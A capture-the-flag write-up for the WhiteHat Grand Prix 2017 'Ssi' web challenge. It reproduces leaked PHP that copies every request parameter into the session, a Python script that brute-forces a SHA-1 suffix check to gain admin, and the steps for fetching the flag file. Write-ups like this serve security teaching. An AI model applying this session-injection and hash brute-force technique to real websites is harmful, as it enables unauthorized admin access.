# Writeup
```
Ssi

Link: ssi.grandprix.whitehatvn.com
Backup: bak.ssi.grandprix.whitehatvn.com

Author - BkavTeam
```

# Solve
### Color changes
The link above give us the following page:
![here](https://github.com/quanght55/CTFWriteups/blob/master/CTF/Whitehatgrandprix2017/SSI/images/SSi.png)
When input a color like, it is inserted into code and produced:
`<h1 style="color:xxx;">WhiteHat Grand Prix 2017</h1>`

### Backup file 
I find out that `index.php~` exists and contains PHP code:
```
<?php 
    session_start();
    if(isset($_POST['textColor'])){
        foreach($_REQUEST as $key => $val) { 
            $_SESSION[$key] = $val; 
        }
    }
    if(array_key_exists("textColor", $_SESSION)){
        $style ="color:".$_SESSION['textColor'].";";
    }
    // 
    if(array_key_exists('secret', $_SESSION) and array_key_exists('textColor', $_SESSION)){
        sleep(1);
        $temp = $_SESSION['secret'].$_SESSION['textColor'];
        if(substr(sha1($temp),-3) ==='ab1'){
            //Do sth admin permission
        }
        else{
            $status ="You are logged in as a regular user.";
        }
        
    }
    else{
        $status ="You are logged in as a regular user.";
    }
    
    $title = "<h1 style='$style'>WhiteHat Grand Prix 2017</h1>"; 
?>
```

If reading this code I can see that to be `admin` we need a `textColor` and `secret` parameter to be `POSTED` and `substr(sha1($temp),-3) ==='ab1'` (ending with characters "ab1")

Then I write [this](https://github.com/quanght55/CTFWriteups/blob/master/CTF/Whitehatgrandprix2017/SSI/genSecret.py) script to produce `textColor`=red and `secret`=gbak, I became admin
```
from itertools import product
import hashlib
textColor="red"

for i in range(10):
	for q in product("abcdefghijk",repeat=i):
		m = hashlib.sha1(''.join(q)+textColor)
		print ''.join(q)+textColor
		if (m.hexdigest()[-3:] == "ab1"):
			print "Found: "+m.hexdigest()
			print "Secret: "+''.join(q)
			print "textColor: "+textColor
			exit(0)
```

### Show IP
![here](https://github.com/quanght55/CTFWriteups/blob/master/CTF/Whitehatgrandprix2017/SSI/images/SSI2.png)

Look at the source code I see this `Flag at directory: value_special/flag.txt, value_special = md5(filesize(index.php)-namechannelIRC)`

Okay so the `namechannelIRC` will be `#whitehatgrandprix2017`
filesize of index.php first I thought it will be counted as Bytes but when I run from 0 to 17000 bytes, gives me nothing.Then I think about `K` and yes I can get flag, filesize is `1,6K`. So the last payload is `1,6K-#whitehatgrandprix2017`, md5 = 36789f5cc2688fb98476eea77c6696fe

# Flag
`wget http://ssi.grandprix.whitehatvn.com/36789f5cc2688fb98476eea77c6696fe/flag.txt`

and it contains `Learn_form_yesterday.Live_for_today.Hope_for_tomorrow.`

Following the guidelines of the CTF, we hash this string using SHA-1 and get the flag: WhiteHat{dffb112c136d8317033a2152b8d32a3125cd4e4c}.`
